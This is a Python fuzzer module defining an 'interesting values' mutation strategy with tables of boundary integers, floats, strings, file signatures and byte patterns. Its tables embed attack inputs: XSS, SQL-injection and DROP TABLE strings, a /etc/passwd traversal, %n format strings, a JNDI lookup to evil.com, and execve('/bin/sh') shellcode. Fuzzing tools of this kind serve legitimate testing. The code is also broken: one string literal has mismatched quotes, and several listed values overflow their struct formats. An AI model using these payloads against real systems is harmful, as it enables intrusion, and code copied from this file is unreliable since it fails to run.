import random
import struct
from typing import List, Dict, Any, Union

from .base import MutationStrategy


class InterestingValuesStrategy(MutationStrategy):
    """
    Interesting values strategy that substitutes data with known interesting
    boundary values, edge cases, and problematic values that often trigger bugs.
    """

    def __init__(self):
        """Initialize the interesting values strategy."""
        super().__init__("Interesting Values")
        self.interesting_values = self._initialize_interesting_values()

    def _initialize_interesting_values(self) -> Dict[str, List[Union[int, str, bytes]]]:
        """Initialize dictionaries of interesting values for different contexts."""
        return {
            'integers': {
                '8bit_signed': [-128, -127, -1, 0, 1, 127, 128],
                '8bit_unsigned': [0, 1, 2, 254, 255, 256],
                '16bit_signed': [-32768, -32767, -1, 0, 1, 32767, 32768],
                '16bit_unsigned': [0, 1, 2, 65534, 65535, 65536],
                '32bit_signed': [-2147483648, -2147483647, -1, 0, 1, 2147483647, 2147483648],
                '32bit_unsigned': [0, 1, 2, 4294967294, 4294967295, 4294967296],
                '64bit_signed': [-9223372036854775808, -9223372036854775807, -1, 0, 1,
                                9223372036854775807, 9223372036854775808],
                '64bit_unsigned': [0, 1, 2, 18446744073709551614, 18446744073709551615, 18446744073709551616],
            },
            'floating_point': {
                '32bit': [0.0, -0.0, 1.0, -1.0, 3.14159265359, 2.71828182846,
                         1.17549435e-38, 3.40282347e+38, -1.17549435e-38, -3.40282347e+38,
                         float('inf'), float('-inf'), float('nan')],
                '64bit': [0.0, -0.0, 1.0, -1.0, 3.14159265359, 2.71828182846,
                         2.2250738585072014e-308, 1.7976931348623157e+308,
                         -2.2250738585072014e-308, -1.7976931348623157e+308,
                         1e-10, 1e+10, -1e-10, -1e+10,
                         float('inf'), float('-inf'), float('nan')],
            },
            'strings': {
                'boundaries': ['', 'a', 'aa', 'A', 'AA', ' ', '\t', '\n', '\r', '\x00'],
                'lengths': ['A' * i for i in [1, 2, 3, 4, 7, 8, 15, 16, 31, 32, 63, 64, 127, 128,
                                              255, 256, 511, 512, 1023, 1024, 2047, 2048, 4095, 4096]],
                'special_chars': ['\x00', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07',
                                 '\x08', '\x09', '\x0a', '\x0b', '\x0c', '\x0d', '\x0e', '\x0f',
                                 '\x1b', '\x1c', '\x1d', '\x1e', '\x1f', '\x7f',
                                 '\x80', '\x81', '\xfe', '\xff'],
                'unicode': ['🚀🔥💯🎯', 'café résumé naïve', 'привет мир', 'こんにちは世界',
                           'العربية', 'עברית', '👨‍💻👩‍💻', '\u202e\u202d\u202a',
                           '\ufeff\u200b\u200c\u200d'],
                'formats': ['%s', '%d', '%x', '%n', '%f', '%p', '%100s', '%.100s',
                           '%08x', '%016x', '%1000000s', '%.1000000s'],
                'injections': ["<script>alert('xss')</script>", "' OR '1'='1", '../../../etc/passwd\x00",
                              '{{7*7}}', '${jndi:ldap://evil.com/a}', "\'; DROP TABLE users; --'"],
            },
            'bytes': {
                'boundaries': [b'\x00', b'\x01', b'\xff', b'\xfe'],
                'patterns': [b'\x00' * 4, b'\xff' * 4, b'\x41' * 4, b'\x90' * 4,
                           b'\x00\x01\x02\x03', b'\xff\xfe\xfd\xfc',
                           b'\xaa\xaa\xaa\xaa', b'\x55\x55\x55\x55'],
                'shellcode': [b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80',
                            b'\x90' * 100,  # NOP sled
                            b'\x41' * 100,  # Buffer overflow pattern
                            b'A' * 4 + b'B' * 4 + b'C' * 4],  # Pattern for crash analysis
            },
            'file_formats': {
                'images': [
                    b'\xff\xd8\xff\xe0\x00\x10JFIF',  # JPEG header
                    b'\x89PNG\r\n\x1a\n',             # PNG header
                    b'GIF87a',                        # GIF87a header
                    b'GIF89a',                        # GIF89a header
                    b'RIFF', b'WEBP',                 # WebP
                    b'ftypmp42',                      # MP4
                ],
                'archives': [
                    b'PK\x03\x04',                    # ZIP
                    b'PK\x05\x06',                    # ZIP empty
                    b'PK\x07\x08',                    # ZIP spanned
                    b'\x1f\x8b\x08',                  # GZIP
                    b'BZh',                           # BZIP2
                    b'\x37\x7a\xbc\xaf\x27\x1c',      # 7Z
                ],
                'executables': [
                    b'\x7fELF',                       # ELF
                    b'MZ',                           # PE/DOS
                    b'\xfe\xed\xfa\xce',              # Mach-O (32-bit)
                    b'\xfe\xed\xfa\xcf',              # Mach-O (64-bit)
                    b'\xca\xfe\xba\xbe',              # Java class
                ],
                'documents': [
                    b'%PDF',                         # PDF
                    b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1',  # OLE2 (Office docs)
                    b'PK\x03\x04Microsoft Office',    # Office Open XML
                ],
            },
            'network': {
                'ports': [0, 1, 20, 21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995,
                         8080, 8443, 65535, 65536],
                'addresses': [
                    b'\x00\x00\x00\x00',            # 0.0.0.0
                    b'\x7f\x00\x00\x01',            # 127.0.0.1
                    b'\xff\xff\xff\xff',            # 255.255.255.255
                    b'\xc0\xa8\x01\x01',            # 192.168.1.1
                    b'\x0a\x00\x00\x01',            # 10.0.0.1
                ],
                'protocols': [6, 17, 1, 2, 41],  # TCP, UDP, ICMP, IGMP, IPv6
            },
            'time': {
                'timestamps': [0, 1, -1, 2147483647, 4294967295, 9223372036854775807,
                               1640995200,  # 2022-01-01
                               253402300799, # 9999-12-31
                               -2208988800, # 1900-01-01
                               86400,       # 1 day in seconds
                               31536000,    # 1 year in seconds
                               987654321],  # Arbitrary timestamp
            },
            'colors': {
                'rgb': [0x000000, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFFFF, 0x808080],
                'rgba': [0x00000000, 0xFF000000, 0x00FF0000, 0x0000FF00, 0xFFFFFFFF],
            },
            'permissions': {
                'file_modes': [0o000, 0o111, 0o222, 0o333, 0o444, 0o555, 0o666, 0o777,
                              0o644, 0o755, 0o600, 0o400],
                'flags': [0, 1, 2, 4, 8, 16, 32, 64, 128, 255, 256, 512, 1024, 65535],
            }
        }

    def apply(self, data: bytes) -> bytes:
        """
        Apply interesting value mutations.

        Args:
            data: Original input data

        Returns:
            Data with interesting values applied
        """
        if not data:
            return self._generate_interesting_value()

        mutation_type = random.choice([
            'integer_substitution',
            'float_substitution',
            'string_substitution',
            'byte_pattern_substitution',
            'boundary_value_substitution',
            'format_specific_substitution'
        ])

        if mutation_type == 'integer_substitution':
            return self._substitute_integer(data)
        elif mutation_type == 'float_substitution':
            return self._substitute_float(data)
        elif mutation_type == 'string_substitution':
            return self._substitute_string(data)
        elif mutation_type == 'byte_pattern_substitution':
            return self._substitute_byte_pattern(data)
        elif mutation_type == 'boundary_value_substitution':
            return self._substitute_boundary_value(data)
        else:  # format_specific_substitution
            return self._substitute_format_specific(data)

    def _substitute_integer(self, data: bytes) -> bytes:
        """Substitute integer values with interesting integer values."""
        if len(data) < 2:
            return self._get_interesting_integer_bytes()

        # Determine appropriate integer size
        size_options = []
        if len(data) >= 1:
            size_options.append(1)
        if len(data) >= 2:
            size_options.append(2)
        if len(data) >= 4:
            size_options.append(4)
        if len(data) >= 8:
            size_options.append(8)

        if not size_options:
            return data

        size = random.choice(size_options)
        position = random.randint(0, len(data) - size)

        # Get interesting integer value
        category_map = {1: '8bit', 2: '16bit', 4: '32bit', 8: '64bit'}
        category = category_map[size]

        signed = random.choice([True, False])
        if signed:
            values = self.interesting_values['integers'][f'{category}_signed']
        else:
            values = self.interesting_values['integers'][f'{category}_unsigned']

        interesting_value = random.choice(values)

        # Pack the value
        if size == 1:
            packed = struct.pack('<b', interesting_value) if signed else struct.pack('<B', interesting_value)
        elif size == 2:
            packed = struct.pack('<h', interesting_value) if signed else struct.pack('<H', interesting_value)
        elif size == 4:
            packed = struct.pack('<i', interesting_value) if signed else struct.pack('<I', interesting_value)
        else:  # size == 8
            packed = struct.pack('<q', interesting_value) if signed else struct.pack('<Q', interesting_value)

        # Replace the bytes
        result = bytearray(data)
        result[position:position + size] = packed
        return bytes(result)

    def _substitute_float(self, data: bytes) -> bytes:
        """Substitute floating-point values with interesting float values."""
        size_options = []
        if len(data) >= 4:
            size_options.append(4)
        if len(data) >= 8:
            size_options.append(8)

        if not size_options:
            return data

        size = random.choice(size_options)
        position = random.randint(0, len(data) - size)

        category_map = {4: '32bit', 8: '64bit'}
        category = category_map[size]
        values = self.interesting_values['floating_point'][category]

        interesting_value = random.choice(values)

        # Pack the value
        if size == 4:
            packed = struct.pack('<f', interesting_value)
        else:  # size == 8
            packed = struct.pack('<d', interesting_value)

        # Replace the bytes
        result = bytearray(data)
        result[position:position + size] = packed
        return bytes(result)

    def _substitute_string(self, data: bytes) -> bytes:
        """Substitute string values with interesting string values."""
        try:
            text_data = data.decode('utf-8', errors='ignore')
        except UnicodeDecodeError:
            # For binary data, just insert interesting bytes
            return self._substitute_byte_pattern(data)

        string_categories = list(self.interesting_values['strings'].keys())
        category = random.choice(string_categories)
        strings = self.interesting_values['strings'][category]
        interesting_string = random.choice(strings)

        # Encode and replace/substitute
        encoded_string = interesting_string.encode('utf-8') if isinstance(interesting_string, str) else interesting_string

        if random.random() < 0.5 and len(data) > len(encoded_string):
            # Replace existing content
            position = random.randint(0, len(data) - len(encoded_string))
            result = bytearray(data)
            result[position:position + len(encoded_string)] = encoded_string
            return bytes(result)
        else:
            # Insert or append
            if random.random() < 0.5:
                return encoded_string + data
            else:
                return data + encoded_string

    def _substitute_byte_pattern(self, data: bytes) -> bytes:
        """Substitute byte patterns with interesting patterns."""
        pattern_categories = list(self.interesting_values['bytes'].keys())
        category = random.choice(pattern_categories)
        patterns = self.interesting_values['bytes'][category]
        interesting_pattern = random.choice(patterns)

        if len(data) > len(interesting_pattern):
            # Replace existing content
            position = random.randint(0, len(data) - len(interesting_pattern))
            result = bytearray(data)
            result[position:position + len(interesting_pattern)] = interesting_pattern
            return bytes(result)
        else:
            # Use the pattern as the entire content
            return interesting_pattern

    def _substitute_boundary_value(self, data: bytes) -> bytes:
        """Substitute with boundary values based on size."""
        if not data:
            return self._generate_interesting_value()

        # Select boundary value based on data length
        if len(data) == 1:
            boundary_values = [0, 1, 127, 128, 255, 256]
        elif len(data) == 2:
            boundary_values = [0, 1, 255, 256, 32767, 32768, 65535, 65536]
        elif len(data) == 4:
            boundary_values = [0, 1, 2**31-1, 2**31, 2**32-1, 2**32]
        elif len(data) == 8:
            boundary_values = [0, 1, 2**63-1, 2**63, 2**64-1, 2**64]
        else:
            # For arbitrary lengths, use string boundaries
            boundary_values = [
                b'A' * (len(data) - 1),
                b'A' * len(data),
                b'A' * (len(data) + 1),
                b'\x00' * len(data),
                b'\xff' * len(data),
            ]
            interesting_value = random.choice(boundary_values)
            return interesting_value

        # Pack the chosen boundary value
        boundary_value = random.choice(boundary_values)
        try:
            if len(data) == 1:
                packed = struct.pack('<B', boundary_value & 0xFF)
            elif len(data) == 2:
                packed = struct.pack('<H', boundary_value & 0xFFFF)
            elif len(data) == 4:
                packed = struct.pack('<I', boundary_value & 0xFFFFFFFF)
            else:  # len(data) == 8
                packed = struct.pack('<Q', boundary_value & 0xFFFFFFFFFFFFFFFF)

            return packed
        except struct.error:
            return data

    def _substitute_format_specific(self, data: bytes) -> bytes:
        """Substitute based on detected file format."""
        # Check for known file format signatures
        signatures = {
            b'\xff\xd8\xff': 'jpeg',
            b'\x89PNG': 'png',
            b'GIF8': 'gif',
            b'%PDF': 'pdf',
            b'\x7fELF': 'elf',
            b'PK\x03\x04': 'zip',
        }

        for signature, format_name in signatures.items():
            if data.startswith(signature):
                return self._mutate_specific_format(data, format_name)

        # Default to byte pattern substitution
        return self._substitute_byte_pattern(data)

    def _mutate_specific_format(self, data: bytes, format_name: str) -> bytes:
        """Mutate specific format with interesting values."""
        if format_name == 'jpeg':
            # Corrupt JPEG markers
            if len(data) > 4:
                result = bytearray(data)
                # Corrupt a random byte in the header
                pos = random.randint(2, min(10, len(result) - 1))
                result[pos] = random.randint(0, 255)
                return bytes(result)

        elif format_name == 'png':
            # Corrupt PNG chunks
            if len(data) > 8:
                result = bytearray(data)
                # Corrupt chunk length or type
                chunk_start = 8  # After PNG signature
                if chunk_start + 4 < len(result):
                    pos = random.randint(chunk_start, min(chunk_start + 8, len(result) - 1))
                    result[pos] = random.randint(0, 255)
                return bytes(result)

        elif format_name == 'pdf':
            # Corrupt PDF version or objects
            if len(data) > 8:
                result = bytearray(data)
                # Corrupt PDF version
                for i in range(5, 8):
                    result[i] = random.choice([ord('0'), ord('1'), ord('2'), ord('.'), ord('3')])
                return bytes(result)

        elif format_name == 'elf':
            # Corrupt ELF header
            if len(data) > 16:
                result = bytearray(data)
                # Corrupt a byte in the ELF header
                pos = random.randint(4, min(16, len(result) - 1))
                result[pos] = random.randint(0, 255)
                return bytes(result)

        return data

    def _generate_interesting_value(self) -> bytes:
        """Generate an interesting value from scratch."""
        categories = list(self.interesting_values.keys())
        category = random.choice(categories)

        if category == 'integers':
            subcategory = random.choice(list(self.interesting_values['integers'].keys()))
            values = self.interesting_values['integers'][subcategory]
            value = random.choice(values)
            return struct.pack('<q', value) if '64bit' in subcategory else \
                   struct.pack('<i', value) if '32bit' in subcategory else \
                   struct.pack('<h', value) if '16bit' in subcategory else \
                   struct.pack('<b', value)

        elif category == 'floating_point':
            subcategory = random.choice(list(self.interesting_values['floating_point'].keys()))
            values = self.interesting_values['floating_point'][subcategory]
            value = random.choice(values)
            return struct.pack('<d', value) if '64bit' in subcategory else struct.pack('<f', value)

        elif category == 'strings':
            subcategory = random.choice(list(self.interesting_values['strings'].keys()))
            values = self.interesting_values['strings'][subcategory]
            value = random.choice(values)
            return value.encode('utf-8') if isinstance(value, str) else value

        elif category == 'bytes':
            subcategory = random.choice(list(self.interesting_values['bytes'].keys()))
            values = self.interesting_values['bytes'][subcategory]
            return random.choice(values)

        elif category == 'file_formats':
            subcategory = random.choice(list(self.interesting_values['file_formats'].keys()))
            values = self.interesting_values['file_formats'][subcategory]
            return random.choice(values)

        else:
            # For other categories, generate a simple interesting value
            return random.choice([b'\x00', b'\xff', b'A' * 100, b'test', b'0'])

    def _get_interesting_integer_bytes(self) -> bytes:
        """Get interesting integer values as bytes."""
        int_categories = list(self.interesting_values['integers'].keys())
        category = random.choice(int_categories)
        values = self.interesting_values['integers'][category]
        value = random.choice(values)

        if '64bit' in category:
            return struct.pack('<q', value)
        elif '32bit' in category:
            return struct.pack('<i', value)
        elif '16bit' in category:
            return struct.pack('<h', value)
        else:  # 8bit
            return struct.pack('<b', value)

    def get_description(self) -> str:
        """Get a description of the interesting values strategy."""
        return "Substitutes data with known interesting boundary and edge case values"

    def get_effectiveness_score(self) -> float:
        """Very effective for finding boundary-related and overflow vulnerabilities."""
        return 0.9

    def get_complexity_score(self) -> float:
        """Moderate complexity due to value categorization."""
        return 0.3
